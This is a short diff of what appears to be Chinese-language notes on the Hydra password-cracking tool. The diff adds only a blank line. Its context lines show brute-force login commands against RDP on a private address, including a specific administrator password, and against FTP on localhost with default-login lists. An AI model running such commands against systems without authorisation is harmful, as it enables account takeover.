@@ -13,6 +13,7 @@ hydra -l administrator -p Wutos2017 10.11.2.34 rdp
 hydra -L admin.txt -P pass.txt 10.11.2.34 rdp
 
 * 也可以执行
+
 hydra -l admin -p password ftp://localhost/
 
 hydra -L default_logins.txt -p test ftp://localhost/
